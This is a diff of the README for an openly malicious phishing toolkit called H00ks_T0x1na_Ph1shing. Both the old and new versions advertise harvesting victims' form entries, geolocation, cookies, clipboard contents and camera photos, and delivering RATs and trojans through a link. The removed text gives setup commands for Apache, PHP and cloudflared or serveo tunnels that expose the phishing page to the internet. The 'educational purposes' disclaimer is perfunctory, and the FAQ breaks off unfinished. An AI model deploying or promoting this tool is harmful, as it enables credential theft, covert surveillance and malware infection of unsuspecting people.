@@ -1,89 +1,101 @@
+
 # H00ks_T0x1na_Ph1shing
 
-Ferramenta de Phsishing Completa e Personalizavel e de Codigo livre.
-![git-2](https://github.com/user-attachments/assets/fd355633-7191-4e43-9383-8ad5a1cb1107)
+<p align='center'>
+<img src="./logo.png" width=200 alt=" Logo"/>
+</p>
 
-Precisa de um servidor externo como na foto cloudflare mas podem ser outros como OpenSSH.... 
-[...]
-![git-4](https://github.com/user-attachments/assets/52485404-da41-4b37-b284-8ac0cf4badb6)
+H00ks_T0x1na_Ph1shing is a Phishing (Social Engineering) tool used to remotely control a computer or a mobile phone from links as a helper. It is written in HTML, CSS, PHP, JavaScript, BashScript and is compatible with Windows, Android and probably iPhone. It was created to be stable, completely open source, easy to use and with many customizable features.
 
+</span>
 
+## What H00ks_T0x1na_Ph1shing Apart
 
-Necessita do php para coletar os dados....
+H00ks_T0x1na_Ph1shing stands out from the crowd for several reasons:
 
-[...]
-
-![git-5](https://github.com/user-attachments/assets/36866786-795e-4b70-af9a-5227213146e4)
-
-
-
-
-
-
-
-Ferramenta completa de coleta de dados, desde informções do formulario que é personalizavel, tem coleta de localização, cookies do navegador (Não manipulavel, favor cofigurar corretamente no beef).... E personalizavel ao ponto de poder trocar a imagem de fundo
-
-
-Porem salve a imagem do fundo da pagina sempre como "1.jpg" e coloquem o arquivo malicioso como "arquivo.exe" ou troque se prefirir o arquivo "arquivo.exe" no codigo da pagina
-![git-3](https://github.com/user-attachments/assets/fa8cc3ce-a99b-49c3-bf6a-b79bef5177d6)
-
+- ** Easy portability
+- ** Totally versatile
+- ** Functions with implementation of trojans
+- ** Tool stands out from the rest
+- ** Does everything that the others do (such as capturing cookies, capturing geolocation, capturing the clipboard, forms, and sending trojans without user interaction)
+- ** Totally open source and customizable to your taste
+- ** Well-made styling and without many frills
+- ** Constant support and updates of the tool
+- ** Easy to produce the link
+- ** Receives data from PhP to the data.txt file
+- ** You can use other manipulation tools (EvilGinxs, Beef, etc...)
+- ** You, the user, can change the code without much difficulty
+- ** Requeriments.sh made to download and update all dependencies, already updating user packages without difficulty and with a single command!
 
 
-Volta as informaçoes em dados.txt... Localização (volta em longitude e a latitude (Localização: Lat: loc do alvo Long: loc do alvo)), se tem cookies no navegador, volta o formulario digitado, sobe uma carga maliciosa no dispositivo da vitima pelo navegador, e captura a clipboard da vitima .... ![git](https://github.com/user-attachments/assets/fa257869-aafb-4b1c-a28b-029a872c6b15)
+
+## Features
+
+### CAMERA
+
+- Captura fotos em .pnp
+- Arquivado em upload
+- Nome de imagens totalmente ramdomizados
 
 
-Com Cloud Flare:
+### Localização - KeyLogger
 
-Baixe e Inicie o Servidor Apache2:
-"sudo apt-get install apache2 -y"
-"sudo systemctl start apache2 && sudo systemctl enable apache2.service"
-
-Baixe o php:
-"sudo apt-get install php -y"
-
-Inicie o php:
-"php -S localhost:8080"
-
-Instale o CloudFlare desta maneira:
-"curl -O https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.deb
-sudo dpkg -i cloudflared-stable-linux-amd64.deb"
-
-Faça login no cloudflare e crie a conta:
-"cloudflared tunnel login"
-
-Inicie o servidor cloudflare:
-"cloudflared tunnel --url http://localhost:8080"
-
-Diretorios corretos:
-"git clone https://github.com/z3ldr1/H00ks_T0x1na_Ph1shing.git && cd H00ks_T0x1na_Ph1shing"
-"mkdir uploads && cd ../"
-"chmod +x H00ks_T0x1na_Ph1shing/*"
-"sudo cp -r H00ks_T0x1na_Ph1shing/ /var/www/html"
-
-or
-
-Baixe e Inicie o Servidor Apache2:
-"sudo apt-get install apache2"
-"sudo systemctl start apache2 && sudo systemctl enable apache2.service"
-
-Baixe o php:
-"sudo apt-get install php -y"
+- Puxa a localização e volta como Longitude e latidute
+- Tem um keylohggger que puxa a clipboard do cliente
 
 
-Inicie o php:
-php -S localhost:8080
 
-Use o OpenSSH detsa maneira:
-"ssh -R 80:localhost:443 serveo.net"
+### Cookies
 
-Diretorios corretos:
-"git clone https://github.com/z3ldr1/H00ks_T0x1na_Ph1shing.git && cd H00ks_T0x1na_Ph1shing"
-"mkdir uploads && cd ../"
-"chmod +x H00ks_T0x1na_Ph1shing/*"
-"sudo cp -r H00ks_T0x1na_Ph1shing/ /var/www/html"
+- Volta se tem cookies no navegador da vitima
+- Cookies totalmente configuraveis com Beef-xss
+
+### Implementação de RATS
+
+- Pode colocar arquivos .exe, ou .bat até mesmo .apk para que seja feito o download da carga maliciosa atraves do link
+- E personalizavel a partir do codigo fonte index.php
 
 
-Hacked By: z3ldr1s
-Vulgo: ZEL ZEL
+### Servidores
 
-Aproveite :)
+- Aceita-se Servers CloudFlares
+- Aceita-se Servers OpenSsh
+
+### Espelhamento da pagina
+
+- Espelhe a pagina a partir de um servidor local
+- Nginx
+- Apache2
+
+
+
+## Issues, Bugs and Contributions
+
+If you find any issues or bugs, please report them [here](https://github.com/z3ldr1/H00ks_T0x1na_Ph1shing/issues). If you would like to contribute to the project, please fork the repository and submit a pull request. All contributions are welcome. If you don't know how to build the malware, or use it, then please don't open an issue as it will be closed as completed immediately.
+If you like the project, please leave a star!
+
+## Legal Disclaimer
+
+This tool is for educational purposes only. I am not responsible for any damage done by this tool. Please always stay within legal and ethical boundaries.
+
+## License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+## FAQ
+
+### How do I use this tool?
+To get started with H00ks_T0x1na_Ph1shing, follow these simple steps:
+
+1. **Go to the Releases Tab**: Navigate to the "Releases" tab of this GitHub repository to find the latest release. You can find it [here](https://github.com/z3ldr1/H00ks_T0x1na_Ph1shing).
+
+2. **Download the Latest Release**: Select the latest release from the list of releases and download the zip file containing the application files.
+
+3. 
+
+## Contact
+
+**Contact the Developer:**
+- **Telegram:** [@Z3ldr1s](https://t.me/@Z3ldr1s)
+- **Discord:** zeldr1s_prime
+
